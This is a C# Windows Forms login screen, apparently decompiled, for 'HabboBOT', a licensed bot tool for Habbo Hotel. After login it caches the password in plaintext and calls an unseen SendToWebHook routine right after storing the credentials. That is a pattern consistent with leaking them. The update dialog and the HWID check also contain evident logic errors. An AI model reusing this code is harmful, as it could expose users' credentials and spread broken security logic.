
using HabboBOT.Entities;
using HabboBOT.Entities.API;
using HabboBOT.Entities.Auth;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace HabboBOT
{
  public class Login : Form
  {
    private Point position;
    private IContainer components = (IContainer) null;
    private Label labelMinimize;
    private Label labelExit;
    private Label labelError;
    private TextBox textUsername;
    private TextBox textPassword;
    private Button button1;

    public Login()
    {
      this.InitializeComponent();
      this.CheckForUpdates();
      this.labelError.Text = "HabboBOT - Login";
    }

    private void Form1_MouseDown(object sender, MouseEventArgs e) => this.position = e.Location;

    private void CheckForUpdates()
    {
      if (!(Configuration.VERSION != GetInfo.GetHabboBOTVersion()))
        return;
     if (MessageBox.Show("Nueva Actualizacion! Contacta con AleejkE para obtener la ultima version de este programa. Pulsa cualquier boton para cerrar esta ventana...", "HabboBOT - Update", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        Process.Start(Configuration.DownloadUrl);
      else
        Environment.Exit(1);
    }

    private void Form1_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      this.Location = new Point(this.Location.X + (e.Location.X - this.position.X), this.Location.Y + (e.Location.Y - this.position.Y));
    }

    private void MinimizeHover(object sender, EventArgs e)
    {
      this.labelMinimize.ForeColor = Color.Red;
      this.labelMinimize.Cursor = Cursors.Hand;
    }

    private void ExitLeave(object sender, EventArgs e)
    {
      this.labelExit.ForeColor = Color.White;
      this.labelExit.Cursor = Cursors.Default;
    }

    private void MinimizeLeave(object sender, EventArgs e)
    {
      this.labelMinimize.ForeColor = Color.White;
      this.labelMinimize.Cursor = Cursors.Default;
    }

    private void labelExit_Click(object sender, EventArgs e) => Application.Exit();

    private void ExitHover(object sender, EventArgs e)
    {
      this.labelExit.ForeColor = Color.Red;
      this.labelExit.Cursor = Cursors.Hand;
    }

    private void labelMinimize_Click(object sender, EventArgs e) => this.WindowState = FormWindowState.Minimized;

    private async void button1_Click(object sender, EventArgs e)
    {
      string username = this.textUsername.Text;
      string password = this.textPassword.Text;
      bool isExpired = await Verify.UserExpired(username, password);
      bool userExists = await Verify.userExists(username, password);
      bool HWID = await Verify.VerifyHWID(username, password);
      if (userExists)
      {
        if (!isExpired)
        {
          if (!HWID)
          {
            this.Hide();
            Configuration.Username = username;
            Configuration.Password = password;
            Configuration.lastHotel = ".fr";
            Configuration.logs = "true";
            Send.SendToWebHook();
            Cache.Update("username", username);
            Cache.Update("password", password);
            Cache.Update("hotel", ".fr");
            Form1 form = new Form1();
            form.Show();
            form = (Form1) null;
            username = (string) null;
            password = (string) null;
          }
          else
          {
            this.labelError.Text = "HWID Invalid!";
            username = (string) null;
            password = (string) null;
          }
        }
        else
        {
          this.labelError.Text = "Plan expired!";
          username = (string) null;
          password = (string) null;
        }
      }
      else
      {
        this.labelError.Text = "Username/Password invalid!";
        username = (string) null;
        password = (string) null;
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.labelMinimize = new Label();
      this.labelExit = new Label();
      this.labelError = new Label();
      this.textUsername = new TextBox();
      this.textPassword = new TextBox();
      this.button1 = new Button();
      this.SuspendLayout();
      this.labelMinimize.AutoSize = true;
      this.labelMinimize.Font = new Font("Segoe UI Symbol", 26.25f, FontStyle.Regular, GraphicsUnit.Point);
      this.labelMinimize.ForeColor = Color.White;
      this.labelMinimize.Location = new Point(316, -14);
      this.labelMinimize.Margin = new Padding(4, 0, 4, 0);
      this.labelMinimize.Name = "labelMinimize";
      this.labelMinimize.Size = new Size(35, 47);
      this.labelMinimize.TabIndex = 3;
      this.labelMinimize.Text = "_";
      this.labelMinimize.Click += new EventHandler(this.labelMinimize_Click);
      this.labelMinimize.MouseLeave += new EventHandler(this.MinimizeLeave);
      this.labelMinimize.MouseHover += new EventHandler(this.MinimizeHover);
      this.labelExit.AutoSize = true;
      this.labelExit.Font = new Font("Segoe UI Symbol", 21.75f, FontStyle.Regular, GraphicsUnit.Point);
      this.labelExit.ForeColor = Color.White;
      this.labelExit.Location = new Point(354, -6);
      this.labelExit.Margin = new Padding(4, 0, 4, 0);
      this.labelExit.Name = "labelExit";
      this.labelExit.Size = new Size(34, 40);
      this.labelExit.TabIndex = 2;
      this.labelExit.Text = "X";
      this.labelExit.Click += new EventHandler(this.labelExit_Click);
      this.labelExit.MouseLeave += new EventHandler(this.ExitLeave);
      this.labelExit.MouseHover += new EventHandler(this.ExitHover);
      this.labelError.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.labelError.AutoSize = true;
      this.labelError.Font = new Font("Segoe UI", 14.25f, FontStyle.Bold, GraphicsUnit.Point);
      this.labelError.ForeColor = Color.White;
      this.labelError.Location = new Point(62, 44);
      this.labelError.Name = "labelError";
      this.labelError.Size = new Size(264, 25);
      this.labelError.TabIndex = 4;
      this.labelError.Text = "Username/Password invalid!";
      this.labelError.TextAlign = ContentAlignment.MiddleCenter;
      this.textUsername.BackColor = Color.DimGray;
      this.textUsername.BorderStyle = BorderStyle.FixedSingle;
      this.textUsername.ForeColor = Color.White;
      this.textUsername.Location = new Point(86, 108);
      this.textUsername.Name = "textUsername";
      this.textUsername.Size = new Size(190, 23);
      this.textUsername.TabIndex = 5;
      this.textUsername.Text = "Username";
      this.textPassword.BackColor = Color.DimGray;
      this.textPassword.BorderStyle = BorderStyle.FixedSingle;
      this.textPassword.ForeColor = Color.White;
      this.textPassword.Location = new Point(86, 159);
      this.textPassword.Name = "textPassword";
      this.textPassword.Size = new Size(190, 23);
      this.textPassword.TabIndex = 6;
      this.textPassword.Text = "Password";
      this.button1.BackColor = Color.DimGray;
      this.button1.FlatAppearance.BorderSize = 0;
      this.button1.FlatStyle = FlatStyle.Flat;
      this.button1.ForeColor = Color.White;
      this.button1.Location = new Point(86, 214);
      this.button1.Name = "button1";
      this.button1.Size = new Size(190, 31);
      this.button1.TabIndex = 7;
      //this.button1.Text = nameof (Login);
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.AutoScaleDimensions = new SizeF(7f, 15f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(55, 55, 55);
      this.ClientSize = new Size(387, 330);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.textPassword);
      this.Controls.Add((Control) this.textUsername);
      this.Controls.Add((Control) this.labelError);
      this.Controls.Add((Control) this.labelMinimize);
      this.Controls.Add((Control) this.labelExit);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Margin = new Padding(4, 3, 4, 3);
     // this.Name = nameof (Login);
      //this.Text = nameof (Login);
      this.MouseDown += new MouseEventHandler(this.Form1_MouseDown);
      this.MouseMove += new MouseEventHandler(this.Form1_MouseMove);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
